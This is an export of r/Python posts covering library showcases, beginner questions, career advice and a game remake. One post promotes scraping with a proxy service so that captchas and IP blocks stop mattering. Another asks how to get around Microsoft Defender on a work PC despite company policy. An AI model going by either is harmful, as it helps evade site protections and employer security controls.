* `entropic_measurement`¬†is the¬†**only open tool**¬†(to my knowledge) providing‚ÄØ:
   * Explicit, universal bias correction based on entropy theory
   * End-to-end traceability (logging, export, auditability)
   * All code and methods in the public domain (CC0), open for any use or adaptation
* Please let me know if other libraries exist‚Äîit would be great to compare strengths and limitations!

**GitHub and documentation:**  
üëâ¬†[https://github.com/rconstant1/entropic\_measurement](https://github.com/rconstant1/entropic_measurement)

I created this library as an independent researcher in Geneva. All feedback, questions, and suggestions (including critical!) are very welcome.  
If you test it in real use (successes or problems!), your report would help future improvements.

Thank you for reading and for your insights!  
Best wishes,  
Raphael"
1m7zw86,Scalar product with lists as coordinates,Realistic-Air-2797,11,20,2025-07-24 09:35:05,https://www.reddit.com/r/Python/comments/1m7zw86/scalar_product_with_lists_as_coordinates/,"Hello guys,

I have quite theoretical question. I have an exercise to make scalar product out of:

    a = [(1, 2), (3, 4), (5, 6)]
    b = [(7, 8), (9, 10), (11, 12)]

So from my perspective that would be:

`def scalar_product(x, y):`

`return [sum(sum(i * j for i, j in zip(m, n)) for m, n in zip(x, y))]`

But i am curious, does things like that happen in real programming? Or should i present it as:



    def scalar_product(x, y):
    return [sum(i * j for i, j in zip(m, n)) for m, n in zip(x, y)]?"
1m7z9c2,SAP Consultant looking for career advice,Nafnaf911,1,4,2025-07-24 08:54:17,https://www.reddit.com/r/Python/comments/1m7z9c2/sap_consultant_looking_for_career_advice/,"Hi everyone, 

I am 24 years old and have started doing SAP FICO consultancy about a year ago (first job post graduation). I get tired and depressed about doing accounting and get to realize it will not be possible for me to do actual finance (market risk management etc...) as it is so niche to be a main activity.

I a have a double degree in finance and asset management but I lack proper hard skill to enter this world and feel like Python could be a good way to get into it. A good friend of mine from college used it for his thesis and told me it was very interesting to use for finance. 

I struggle with the idea of throwing away a year and a half of FICO experience and start over. 

Does anyone worked or work with SAP have advices ? How did you learned python ? What helped you with SAP background ? "
1m7xyvx,Installation problems with dlib,Pleasant_Fly3175,0,2,2025-07-24 07:31:12,https://www.reddit.com/r/Python/comments/1m7xyvx/installation_problems_with_dlib/,"I am basically trying to isntall dlib so i can run some face recognition library, but the problem is everywhere i try to isntall it i get the same error (cmd, cmd in vs code, the x64 native tools comand prompt for VS 2022) and i always get the same error i have alrady installde the vs code installer and selected the windows 11SDK.. , the windows Cmake etc. and still nothing. the error is ( ERROR: Failed building wheel for dlib). I am slowly going mad, does any one have any solutions?"
1m7vnie,"Sharing my package for LLM context maker/helper, installs with pipx (which is fabulous btw)",wuu73,0,0,2025-07-24 05:12:16,https://www.reddit.com/r/Python/comments/1m7vnie/sharing_my_package_for_llm_context_makerhelper/,"pipx works perfectly for my tool! zero problems, it runs exactly as it did inside its venv, on any OS. I figured I would share that little bit of info, maybe someone reading this won't struggle to figure out how to package a cross platform python app with UI.

[https://github.com/detroittommy879/aicodeprep-gui](https://github.com/detroittommy879/aicodeprep-gui)

My tool [aicodeprep-gui](https://wuu73.org/aicp) helps you pack up a project folder (and all subfolders) quick to the clipboard so you can paste all the needed files at once. I usually need to use it when I am trying to figure out how to fix bugs, plan new features or change something, or anything difficult. With all the shiny new fun sounding stuff out there.. MCP servers, agentic software and tools, I know from just so much experience that almost always.. as soon as you give an LLM a tool, to edit files or use MCP servers, anything other than your exact problem, it gets dumber. That is too much unfortunately. Enough to ruin your day.. get stuck in loops unable to get anywhere.

  
I have figured out that you really should devote 100% of the AI to the hard problem or complex task.. no tool usage in the prompt, no MCP.. Throws them off! Thats why people waste so much money thinking they need Claude 4 Opus for everything!

Its unfortunate but this is the state of things today. People are yelling at their computers, mad because Claude 4 Opus cannot fix some simple problem. That same problem might be EASY for a dumber model to solve on its native web chat interface. 

This stops you from having to attach file.. attach file... over and over or copy paste copy paste.. or typing the same line at the end every time. Everything in this tool is to save time and save you from the little annoying tedious work at every step of trying to get good quality context over to the AI.

Its kind of hard to explain exactly how or why this tool helps so much in few words, all the options on it are needed and obvious after coding with AI long enough. Saves you a ton of money while making all the AIs respond more intelligently. 

Feedback welcome (I get a lot of positive feedback), or any ideas on how to explain it better. Without being too long. I will work on the docs and come up with better visual explainers.

Target audience: developers, python or any other programming languages. Its not really limited to that though, its useful for any markdown or text files, config files.. 

Compared to similar tools: This has a UI, runs locally (also indifferent to having a github repository), python and Qt are faster, lightweight vs Electron/web apps (seen some of those). Lots of other context packers that are command line only. I try to add only useful things like putting the prompt in two places to get better LLM response.

"
1m7pphe,Python versions in AWS Lambda vs Lambda Layers,None,4,8,2025-07-24 00:13:21,https://www.reddit.com/r/Python/comments/1m7pphe/python_versions_in_aws_lambda_vs_lambda_layers/,"I am using python in an AWS Lambda environment. The problem is when I update layer - it has a dependency that uses botocore (PynamoDB) which gets updated.

  
When I update the lambda itself, it will update its boto3 and botocore versions too. At some point I get hit with breaking changes where botocore in layer is older than boto3 in the lambda and causes version conflicts. 

My error was as follows.

`TypeError: Session.create_client() got an unexpected keyword argument 'aws_account_id'`

  
How is everyone managing boto3 versions when used across lambdas and layers?

  
Thanks"
1m7pfb4,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,6,0,2025-07-24 00:00:30,https://www.reddit.com/r/Python/comments/1m7pfb4/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1m7m0yp,Built a Universal RAG + Memory System for Claude with MCP - Production Ready,Basic_Soft9158,3,2,2025-07-23 21:36:46,https://www.reddit.com/r/Python/comments/1m7m0yp/built_a_universal_rag_memory_system_for_claude/,"A week ago I shared an early prototype and got amazing feedback. Main request? ""Show us how to actually install this properly.""

**The problem:** Every time you restart Claude Code CLI, you lose everything.

**What I built:** RagCore - universal RAG system with persistent memory via MCP stdio. Claude remembers your project context and queries any documentation you add.

**The magic moment:** Close terminal ‚Üí Restart Claude Code CLI ‚Üí Continue exactly where you left off.

**How it works:**

* Tell Claude ""learn about current project"" ‚Üí automatic memory bank query
* Ask ""implement Laravel validation"" ‚Üí Claude queries RAG server with local LLM
* RAG server logs show exact sources (zero hallucinations)
* Smart token optimization by query complexity

**Results after week of testing:**

* 4,306 Laravel docs indexed, 7-20 second response times
* Works with Python, FastAPI, custom frameworks
* Local LLM (your code never leaves your machine)

**GitHub:** [https://github.com/lexa5575/RagCore](https://github.com/lexa5575/RagCore)

Installation details in comments. What documentation would you want to add?"
1m7j432,Do you save your code written for your job / working hours in your own GitHub repo?,kor3nn,0,23,2025-07-23 19:44:41,https://www.reddit.com/r/Python/comments/1m7j432/do_you_save_your_code_written_for_your_job/,"Hi everyone, first off I'm not sure this is the correct place to post this question but python is my poison :). Second I'm a Network Engineer(Cisco, Palo etc). My question is do you save your own code you write within your job in your own GitHub to potentially use it if you need to get another job? or any advice on this?

One of the main reasons is that I'm proud of the code and tools I have written over the years. I've made full tools used in active business and relyed on for troubleshooting and alerting. I use all libaries / technologies such as Flask, MatPlotLib, Requests, Netmiko etc... I write my own modules for other team members to use. I would like to protect my future by having proof I can use python rather than saying I can if worst comes to worst and I have to find another Job.

I have checked my contract and there isn't anything about owning code / something developed at work as company property as I was hired as a Network Engineer(They knew I have python experience) not as a developer or DevOps Engineer. There is something about confidential data but I would sanitize the code beforehand if I was to save to my own GitHub.

UK Based if that helps with any laws or legalities.

Edit: I see this weighted more for not doing this. I do want to clarify a few things though. I am a full time PAYE employee, I work for a big retail company that does not sell any form of software or technology, most of the scripts and tools have been made to solve a solution for a few examples; A script to rename a ""n"" number of rules of a firewall appliance using the rest API with data from a CSV file, A script to take the CPU of a firewall appliance and plot it on a graph that is presented via a simple flask front end, A script to deploy a new VLAN on a Cisco Nexus switch - VPC. I have written all of these scripts within the team and there are about 15 of us and only one other team member even entertains automation. Ultimately I think speaking to my manager may be the best course of action but haven't decided for sure if I'll go ahead with making repo's on my own GitHub."
1m7i7ie,treemind: A High-Performance Library for Explaining Tree-Based Models,zedeleyici3401,23,1,2025-07-23 19:10:38,https://www.reddit.com/r/Python/comments/1m7i7ie/treemind_a_highperformance_library_for_explaining/,"**What My Project Does:** treemind is a high-performance Python library for interpreting tree-based machine learning models. It provides:

* **One-dimensional feature analysis**: See how a single feature affects model predictions across value intervals.
* **Interaction detection**: Automatically detects and ranks pairwise or higher-order feature interactions.
* **Model compatibility**: Supports LightGBM, XGBoost, CatBoost, scikit-learn, and perpetual out of the box.
* **Visual explanations**: Includes plotting utilities for interaction maps, importance heatmaps, feature influence charts, and more.
* **Optimized performance**: Cython-backed internals for speed, even with deep/wide ensembles.

**Target Audience:** Treemind is ideal for data scientists, ML engineers, and auditors working with tree ensembles who need interpretable, visual, and scalable tools to understand model decisions. Whether you're debugging features or validating fairness, treemind can help.

**Comparison:** Compared to libraries like SHAPx:

* **Specialized**: Focused purely on tree-based models for deeper insight.
* **Faster**: Built for speed with Cython-backed performance.
* **Flexible**: Works across several popular tree ensemble frameworks without manual adjustments.
* **More visual**: Built-in plotting tools to directly see what's going on inside the model.

It may not offer the full model-agnostic versatility of SHAP but provides much more granular and performant explanations specifically for tree-based models.

**Installation:**

    pip install treemind

**GitHub:** [https://github.com/sametcopur/treemind](https://github.com/sametcopur/treemind) 

**Docs:** [https://treemind.readthedocs.io](https://treemind.readthedocs.io)

Still in early stages, so would really appreciate any feedback, contributions, or suggestions! Whether it's bug reports, feature ideas, or usage feedback ‚Äî all welcome.

Thanks for checking it out!"
1m7hypm,Microsoft Defender Flagging uvx as Suspicious on Work PC,iReallyReadiT,25,20,2025-07-23 19:01:12,https://www.reddit.com/r/Python/comments/1m7hypm/microsoft_defender_flagging_uvx_as_suspicious_on/,"Hey folks,

I‚Äôve been working on a project where I use uvx to launch scripts, both for MCP server execution and basic CLI usage. Everything runs smoothly on my personal machine, but I‚Äôve hit a snag on my work computer.

Microsoft Defender is flagging any uvx command as a suspicious app, with a message warning that the program  is new/recent which is blocking me from running these scripts altogether -  even ones I know are safe and part of my own codebase.

Has anyone run into this before? Are there any sane workarounds on my end (e.g., whitelisting the binary locally, code signing, etc.), or am I doomed unless Defender eventually ‚Äúlearns‚Äù to trust uvx?

I know in the end it is limited by company policies but just wondering if there's something that I can try to circumvent it.

Any advice would be hugely appreciated. Thanks!

Project [link](https://github.com/BrunoV21/CodeTide) for reference

"
1m7e6kb,Spectre - record and visualise radio frequency spectrograms,jcfitzpatrick12,16,3,2025-07-23 16:39:05,https://www.reddit.com/r/Python/comments/1m7e6kb/spectre_record_and_visualise_radio_frequency/,"# What My Project Does üì°

Hello all üëã I am a developer from Glasgow and the creator of [***Spectre***](https://github.com/jcfitzpatrick12/spectre), a Python program for recording and visualising radio spectrograms using software-defined radios. It's free, open source, and available on [GitHub](https://github.com/jcfitzpatrick12/spectre).

We've recently published our first alpha release and are **actively looking for new contributors** üì£

# Target Audience ‚úèÔ∏è

Any hobbyists, citizen scientists, or academics who want to achieve scientifically interesting results at low cost. I use *Spectre* for amateur radio astronomy, observing [**solar radio emissions**](https://en.wikipedia.org/wiki/Solar_radio_emission) in my garden using cheap, off-the-shelf software-defined radios and a Raspberry Pi. Other applications include:

* ü™ê Jovian radio observations
* ‚úèÔ∏è Educational outreach and citizen science
* ‚ö° Lightning and atmospheric event detection
* üéõÔ∏è Exploring the radio spectrum

# Call for Contributors üì£

The program is **full-stack**, with plenty of room for folk to get involved with all sorts of backgrounds. Do reach out if you're interested in any of the following areas:

* üì¶ Python package development, unit testing and docs
* üõ†Ô∏è RESTful API development, testing and docs (Flask)
* ‚ö° Performance optimisation (NumPy, SciPy, C++)
* üìö Automated documentation generation (Sphinx)
* üé® Front-end design and development
* üíª Cross-platform support (extending from just Linux to macOS)
* üöÄ CI/CD and deployment (GitHub actions)

**No background** is required in either software-defined radios or digital signal processing. **No extra hardware is required** \- only a general-purpose computer.

‚úâÔ∏è Please do get in touch at [jcfitzpatrick12@gmail.com](mailto:jcfitzpatrick12@gmail.com) ‚úâÔ∏è Or simply get stuck in.

Lastly, if you've got this far I'll take the opportunity to grovel for a start on GitHub ‚≠ê"
1m7djw7,[Showcase] Resk llm secure your LLM  Against Prompt Injection,Zengdard,0,2,2025-07-23 16:14:56,https://www.reddit.com/r/Python/comments/1m7djw7/showcase_resk_llm_secure_your_llm_against_prompt/,"Hi everyone!

I've been working on an experimental open-source project called [**Resk-LLM**](https://github.com/Resk-Security/Resk-LLM) ‚Äî a Python library to help developers **secure applications using Large Language Models (LLMs)** like OpenAI, Anthropic, Cohere, and others.

# üíº What My Project Does

**Resk-LLM** adds a flexible, pluggable **security layer around LLM API calls**. It helps detect and mitigate common vulnerabilities in generative AI systems:

* üö´ Prompt injection protection (regex + vector similarity)
* üîç PII, IP, URL & email detection
* üßº Input sanitization
* üìè Token-aware context management
* üìä Content moderation with custom filters
* üéØ Canary token support for leak tracking

It‚Äôs built to be **multi-provider**, **lightweight**, and easy to integrate into any Python app using LLM APIs.

üîó GitHub: [https://github.com/Resk-Security/Resk-LLM](https://github.com/Resk-Security/Resk-LLM)

# üéØ Target Audience

This project is designed for:

* üßë‚Äçüíª **LLM app developers** who want basic input/output security
* üî¨ **Security researchers** exploring the LLM attack surface
* üéì **Students/hobbyists** learning about AI safety & prompt attacks

‚ö†Ô∏è **Important**: This is an **experimental tool for prototyping** ‚Äî not production-certified or security-audited.

# üìä Comparison with Alternatives

While tools like [`Guardrails.ai`](http://Guardrails.ai) or platform-specific moderation APIs exist, they often have limitations:

|Tool|Open-Source|Multi-Provider|Prompt Injection|PII Detection|Canary Support|
|:-|:-|:-|:-|:-|:-|
|[Guardrails.ai](http://Guardrails.ai)|Partial|No|‚úÖ|‚ùå|‚ùå|
|OpenAI Moderation|‚ùå|No|‚ùå|‚úÖ (limited)|‚ùå|
|**Resk-LLM**|‚úÖ|‚úÖ|‚úÖ (regex + vector)|‚úÖ|‚úÖ|

# üöÄ Example Use Case

    from resk_llm import OpenAIProtector
    from resk_llm.detectors import RESK_EmailDetector
    
    protector = OpenAIProtector(
        model=""gpt-4"",
        detectors=[RESK_EmailDetector()]
    )
    
    user_input = ""Contact me at john.doe@example.com""
    
    if not protector.is_safe_input(user_input):
        raise ValueError(""Sensitive data detected"")
    

Explore examples and use cases:  
üìò [https://github.com/Resk-Security/Resk-LLM](https://github.com/Resk-Security/Resk-LLM)

# üôå Contributions Welcome!"
1m7cib1,Built a simple license API for software protection - would love feedback/contributions!,Life-Abroad-91,15,19,2025-07-23 15:35:57,https://www.reddit.com/r/Python/comments/1m7cib1/built_a_simple_license_api_for_software/,"Hey everyone! üëã

I've been working on a lightweight license management API and thought the community might find it useful.

**What My Project Does:** This is a FastAPI-based license management system that provides:

* License key generation and validation via REST API
* User registration and authentication
* Hardware ID binding for additional security
* Admin dashboard for license management

**Target Audience:** This is aimed at indie developers and small teams who need basic software protection without the complexity or cost of enterprise solutions. It's production-ready for small to medium scale applications, though it could benefit from additional features and testing for larger deployments.

**Comparison:** Unlike commercial services like Keygen, Paddle, or Gumroad's licensing:

* **Self-hosted** \- you control your data and don't pay per license
* **Lightweight** \- minimal dependencies, easy to deploy
* **Simple** \- no complex subscription models or advanced analytics
* **Free** \- open source alternative to paid services

However, it lacks the advanced features of commercial solutions (detailed analytics, payment integration, advanced security).

**GitHub:** [https://github.com/awalki/license\_api](https://github.com/awalki/license_api)

Still in early stages, so would really appreciate any feedback, contributions, or suggestions! Whether it's code review, feature requests, or pointing out security issues I missed üòÖ

Thanks for checking it out!"
1m72jwl,London: Looking for Python devs to join competitive trading algo teams,tradrich,0,2,2025-07-23 07:09:30,https://www.reddit.com/r/Python/comments/1m72jwl/london_looking_for_python_devs_to_join/,"Hey all - if you're **in London** and interested in building Python trading algorithms in a real-world setting, we‚Äôre kicking off something a bit different next week.

We‚Äôre forming small (2 - 4 person) teams to take part in **Battle of the Bots** \- a live trading competition happening later this year. The idea is to mirror real trading desk setups: one person might lead the strategy, others code, test, optimise, or bring domain knowledge. Python is the common thread.

**Next Tuesday 29 July** in **Farringdon**, we‚Äôre hosting the **Kick-Off**:

* Meet potential teammates
* Learn the technical setup (Python, ProfitView platform, BitMEX integration)
* Start forming your team

Later on, selected teams will develop their algos and compete in a **live-market** (not a simulation): the bots you build will be used by actual traders during the main event - with significant prizes for the best-performing algos and traders.

No prior trading experience needed (though it could help!) - just Python and curiosity.

Food, drinks, and good conversation included.

Full details + RSVP: [https://lu.ma/Battle\_of\_the\_Bots\_Kick\_Off](https://lu.ma/Battle_of_the_Bots_Kick_Off)

Happy to answer any questions!"
1m6yuj0,Lumocards-One: Information System,NinjaDoggs,27,2,2025-07-23 03:35:12,https://www.reddit.com/r/Python/comments/1m6yuj0/lumocardsone_information_system/,"Dear Pythonistas!

I'm releasing this prototype I made in Python called Lumocards-One.

It's a terminal application you can use to organize notes and projects and journal entries. See the YouTube video to get an idea of whether you could benefit from this. Happy programming all!

[YouTube Preview of Lumocards-One](https://www.youtube.com/watch?v=B6Djui-SRJE)

[YouTube Installation and Features Video](https://youtu.be/rJgoYZR6Twk?si=oo90qs9eSMoaYF_3)

[Github Project, with install instructions](https://github.com/ariedallas/Lumocards-One)

**What My Project Does**

It allows you to create and organize cards, create an agenda file for today, display your Google calendar, and  manage Journal entries. Also includes a Pomodoro timer and search features.

**Target Audience**¬†

It's meant for Open Source community and as a prototype all computer users who enjoy text-based applications.

**Comparison**¬†

It's similar to other note taking apps, but it has more features and better animations than other programs I've seen/encountered."
1m6rzqv,Superfunctions: solving the problem of duplication of the Python ecosystem into sync and async halve,pomponchik,78,36,2025-07-22 22:19:13,https://www.reddit.com/r/Python/comments/1m6rzqv/superfunctions_solving_the_problem_of_duplication/,"Hello¬†[r/Python](https://www.reddit.com/r/Python/)! üëã

For many years, pythonists have been writing asynchronous versions of old synchronous libraries, violating the DRY principle on a global scale. Just to add async and await in some places, we have to write new libraries! I recently wrote \[transfunctions](https://github.com/pomponchik/transfunctions) - the first solution I know of to this problem.

# What My Project Does

The main feature of this library is `superfunctions`. This is a kind of functions that is fully sync/async agnostic - you can use it as you need. An example:

```python
from asyncio import run
from transfunctions import superfunction,sync_context, async_context

@superfunction(tilde_syntax=False)
def my_superfunction():
    print('so, ', end='')
    with sync_context:
        print(""it's just usual function!"")
    with async_context:
        print(""it's an async function!"")

my_superfunction()
#> so, it's just usual function!

run(my_superfunction())
#> so, it's an async function!
```

As you can see, it works very simply, although there is a lot of magic under the hood. We just got a feature that works both as regular and as coroutine, depending on how we use it. This allows you to write very powerful and versatile libraries that no longer need to be divided into synchronous and asynchronous, they can be any that the client needs.

# Target Audience

Mostly those who write their own libraries. With the superfunctions, you no longer have to choose between sync and async, and you also don't have to write 2 libraries each for synchronous and asynchronous consumers.

# Comparison

It seems that there are no direct analogues in the Python ecosystem. However, something similar is implemented in Zig language, and there is also a similar [maybe_async](https://docs.rs/maybe-async/latest/maybe_async/) project for Rust.

"
1m6lzvk,Wii tanks made in Python,shreklordlover69,64,5,2025-07-22 18:29:00,https://www.reddit.com/r/Python/comments/1m6lzvk/wii_tanks_made_in_python/,"**What My Project Does**  
This is a full remake of the *Wii Play: Tanks!* minigame using Python and Pygame. It replicates the original 20 levels with accurate AI behavior and mechanics. Beyond that, it introduces 30 custom levels and 10 entirely new enemy tank types, each with unique movement, firing, and strategic behaviors. The game includes ricochet bullets, destructible objects, mines, and increasingly harder units.

**Target Audience**  
Intended for beginner to intermediate Python developers, game dev enthusiasts, and fans of the original Wii title. It‚Äôs a hobby project designed for learning, experimentation, and entertainment.

**Comparison**  
This project focuses on AI variety and level design depth. It features 19 distinct enemy types and a total of 50 levels. The AI is written from scratch in basic Python, using A\* and statemachine logic.

**GitHub Repo**  
[https://github.com/Frode-Henrol/Tank\_game](https://github.com/Frode-Henrol/Tank_game)"
1m6jucz,[Tool] virtual-uv: Make `uv` respect your conda/venv environments with zero configuration,Spirited_Prize_6058,0,15,2025-07-22 17:09:27,https://www.reddit.com/r/Python/comments/1m6jucz/tool_virtualuv_make_uv_respect_your_condavenv/,"Hey r/Python! üëã

I created **virtual-uv** to solve a frustrating workflow issue with `uv` \- it always wants to create new virtual environments instead of using the one you're already in.

# What My Project Does

virtual-uv is a zero-configuration wrapper for `uv` that automatically detects and uses your existing virtual environments (conda, venv, virtualenv, etc.) instead of creating new ones.

    pip install virtual-uv
    
    conda activate my-ml-env  # Any environment works (conda, venv, etc.)
    vuv add requests          # Uses YOUR current environment! ‚ú®
    vuv install               # As `poetry install`, install project without removing existing packages
    
    # All uv commands work
    vuv <any-uv-command> [arguments]

**Key features:**

* Automatic virtual environment detection
* Zero configuration required
* Works with all environment types (conda, venv, virtualenv)
* Full compatibility with all `uv` commands
* Protects conda base environment by default

# Target Audience

**Primary**: ML/Data Science researchers and practitioners who use conda environments with large packages (PyTorch, TensorFlow, etc.) and want uv's speed without reinstalling gigabytes of dependencies.

**Secondary**: Python developers who work with multiple virtual environments and want seamless uv integration without manual configuration.

**Production readiness**: Ready for production use. We're using it in CI/CD pipelines and it's stable at version 0.1.4.

# Comparison

No stuff to compare with.

**GitHub**: [https://github.com/open-world-agents/virtual-uv](https://github.com/open-world-agents/virtual-uv)  
**PyPI**: `pip install virtual-uv`

This addresses several long-standing uv issues ([\#1703](https://github.com/astral-sh/uv/issues/1703), [\#11152](https://github.com/astral-sh/uv/issues/11152), [\#11315](https://github.com/astral-sh/uv/issues/11315), [\#11273](https://github.com/astral-sh/uv/issues/11273)) that many of us have been waiting for.

Thoughts? Would love to hear if this solves a pain point for you too!"
1m6ju9v,I built a Python library for AI batch requests - 50% cost savings,agam_more,0,3,2025-07-22 17:09:22,https://www.reddit.com/r/Python/comments/1m6ju9v/i_built_a_python_library_for_ai_batch_requests_50/,"* GitHub repo: [https://github.com/agamm/batchata](https://github.com/agamm/batchata) 
* **What My Project Does**: Unified python API for AI batch requests (50% discount on most providers)
* **Target Audience**: AI/LLM developers looking to process requests at scale for cheap
* **Comparison**: No real alternative other than LiteLLM or instructor's batch CLI

I recently needed to send complex batch requests to LLM providers (Anthropic, OpenAI) for a few projects, but couldn't find a robust Python library that met all my requirements - so I built one!

Batch requests can return a result in up to 24h - in return they reduce the costs to 50% of the realtime prices.

**Key features:**

* Batch requests to Anthropic & OpenAI (new contributions welcome!)
* Structured outputs
* Automatic cost tracking & configurable limits
* State resume for network interruptions
* Citation support (currently Anthropic only)

It's open-source, under active development (breaking changes might be introduced!). Contributions and feedback are very welcome!"
1m6hzcb,Using Python to get on the leaderboard of The Farmer Was Replaced,blender-bender,0,0,2025-07-22 16:00:02,https://www.reddit.com/r/Python/comments/1m6hzcb/using_python_to_get_on_the_leaderboard_of_the/,"This game is still relatively unknown so I‚Äôm hoping some of you can improve on this!

https://youtu.be/ddA-GttnEeY?si=CXpUsZ_WlXt5uIT5
"
1m6gzko,Extracting clean web data with Parsel + Python ‚Äì here‚Äôs how I‚Äôm doing it (and why I‚Äôm sticki,ProfessorOrganic2873,0,7,2025-07-22 15:22:24,https://www.reddit.com/r/Python/comments/1m6gzko/extracting_clean_web_data_with_parsel_python/,"I‚Äôve been working on a few data projects lately that involved scraping structured data from HTML pages‚Äîproduct listings, job boards, and some internal dashboards. I‚Äôve used BeautifulSoup and Scrapy in the past, but I recently gave Parsel a try and was surprised by how efficient it is when paired with Crawlbase.

üß™ My setup:

* Python + Parsel
* Crawlbase for proxy handling and dynamic content
* Output to CSV/JSON/SQLite

Parsel is ridiculously lightweight (a single install), and you can use XPath or CSS selectors interchangeably. For someone who just wants to get clean data out of a page without pulling in a full scraping framework, it‚Äôs been ideal.

‚öôÔ∏è **Why I‚Äôm sticking with it:**

* Less overhead than Scrapy
* Works great with `requests`, no need for extra boilerplate
* XPath + CSS make it super readable
* When paired with Crawlbase, I don‚Äôt have to deal with IP blocks, captchas, or rotating headers‚Äîit just works.

‚úÖ If you‚Äôre doing anything like:

* Monitoring pricing or availability across ecom sites
* Pulling structured data from multi-page sites
* Collecting internal data for BI dashboards

‚Ä¶I recommend checking out Parsel. I followed this blog post [Ultimate Web Scraping Guide with Parsel in Python](https://crawlbase.com/blog/ultimate-web-scraping-guide-with-parsel-in-python/?utm_source=Reddit_Feb&utm_campaign=Reddit_Feb) to get started, and it covers everything: setup, selectors, handling nested elements, and even how to clean + save the output.

Curious to hear from others:  
Anyone else using Parsel outside of Scrapy? Or pairing it with external scraping tools like Crawlbase or any tool similar?"
1m6g0jx,Anyone else doing production Python at a C++ company? Here's how we won hearts and minds.,jfowers_amd,52,16,2025-07-22 14:45:51,https://www.reddit.com/r/Python/comments/1m6g0jx/anyone_else_doing_production_python_at_a_c/,"I work on a local LLM server tool called Lemonade Server at AMD. Early on we made the choice to implement it in Python because that was the only way for our team to keep up with the breakneck pace of change in the LLM space. However, C++ was certainly the expectation of our colleagues and partner teams. 

This blog is about the technical decisions we made to give our Python a native look and feel, which in turn has won people over to the approach.

[Rethinking Local AI: Lemonade Server's Python Advantage](https://www.amd.com/en/developer/resources/technical-articles/2025/rethinking-local-ai-lemonade-servers-python-advantage.html)

I'd love to hear anyone's similar stories! Especially any advice on what else we could be doing to improve native look and feel, reduce install size, etc. would be much appreciated.

This is my first time writing and publishing something like this, so I hope some people find it interesting. I'd love to write more like this in the future if it's useful."
1m6fgwk,[Showcase] Time tracker built with Python + CustomTkinter - lives in system tray & logs to Excel,ar3106,3,2,2025-07-22 14:24:21,https://www.reddit.com/r/Python/comments/1m6fgwk/showcase_time_tracker_built_with_python/,"**What My Project Does**

A simple time tracking app - no login, no installation, that helps to track time for a task and logs data to Excel. Handles pauses, multi day tasks, system freezes.

  
**Target Audience**

For developers, freelancers, students, and anyone who wants to track work without complex setups or distractions.

>**Open-source** and available here:  
üîó [GitHub: a-k-14/time\_keeper](https://github.com/a-k-14/time_keeper)

**Key Features:**

* Lives in the system tray to keep your taskbar clean
* Tracks task time and logs data to an Excel file
* Works offline, very lightweight (\~41 MB)
* No installation required



**Why**

I‚Äôm an **Accountant by profession**, but I‚Äôve always had an interest in programming. I finally took the initiative to begin shifting toward the development/engineering side.

While trying to balance learning and work, I often wondered **where my time was going** and which tasks were worth continuing or delegating so that I can squeeze more time to learn. I looked for a simple time tracking app, but most were bloated or confusing.

So I built **Time Keeper** \- a minimal, no-fuss time tracker using Python and CustomTkinter. 

Would love your feedback :)

  


"
1m6el2w,xaiflow: interactive shap values as mlflow artifacts,Prize_Might4147,3,1,2025-07-22 13:48:44,https://www.reddit.com/r/Python/comments/1m6el2w/xaiflow_interactive_shap_values_as_mlflow/,"**What it does**:  
Our mlflow plugin [xaiflow ](https://github.com/cloudexplain/xaiflow)generates html reports as mlflow artifacts that lets you explore shap values interactively. Just install via pip and add a couple lines of code. We're happy for any feedback. Feel free to ask here or submit issues to the repo. It can anywhere you use mlflow.

You can find a short video how the reports look in the readme

**Target Audience**:  
Anyone using mlflow and Python wanting to explain ML models.

**Comparison**:  
\- There is already a [mlflow builtin tool](https://mlflow.org/docs/latest/api_reference/python_api/mlflow.shap.html) to log shap plots. This is quite helpful but becomes tedious if you want to dive deep into explainability, e.g. if you want to understand the influence factors for 100s of observations. Furthermore they lack interactivity.  
\- There are tools like [shapash](https://www.bing.com/search?pc=MOZI&form=MOZLBR&q=shapash+github) or [what-if tool](https://github.com/PAIR-code/what-if-tool), but those require a running python environment. This plugin let's you log shap values in any productive run and explore them in pure html, with some of the features that the other tools provide (more might be coming if we see interest in this)"
1m6ec0b,"[Showcase]: RunPy: A Python playground for Mac, Windows and Linux",lukehaas,0,11,2025-07-22 13:37:55,https://www.reddit.com/r/Python/comments/1m6ec0b/showcase_runpy_a_python_playground_for_mac/,"# What My Project Does

RunPy is a playground app that gives you a quick and easy way to run Python code. There's no need to create files or run anything in the terminal; you don't even need Python set up on your machine.

# Target Audience

RunPy is primarily aimed at people new to Python who are learning.

The easy setup and side-by-side code to output view makes it easy to understand and demonstrate what the code is doing.

# Comparison

RunPy aims to be very low-friction and easy to use. It‚Äôs also unlike other desktop playground apps in that it includes Python and doesn‚Äôt rely on having Python already set up on the user's system.

Additionally, when RunPy runs your code, it shows you the result of each expression you write without relying on you to write ‚Äúprint‚Äù every time you want to see an output. This means you can just focus on writing code.

Available for download here: [https://github.com/haaslabs/RunPy](https://github.com/haaslabs/RunPy)

Please give it a try, and I'd be really keen to hear any thoughts, feedback or ideas for improvements. Thanks!

"
1m6drdk,Avoiding boilerplate by using immutable default arguments,Vulwsztyn,0,27,2025-07-22 13:13:43,https://www.reddit.com/r/Python/comments/1m6drdk/avoiding_boilerplate_by_using_immutable_default/,"Hi, I recently realised one can use immutable default arguments to avoid a chain of:

```python
def append_to(element, to=None):
    if to is None:
        to = []

```

at the beginning of each function with default argument for set, list, or dict.

[https://vulwsztyn.codeberg.page/posts/avoiding-boilerplate-by-using-immutable-default-arguments-in-python/](https://vulwsztyn.codeberg.page/posts/avoiding-boilerplate-by-using-immutable-default-arguments-in-python/)"
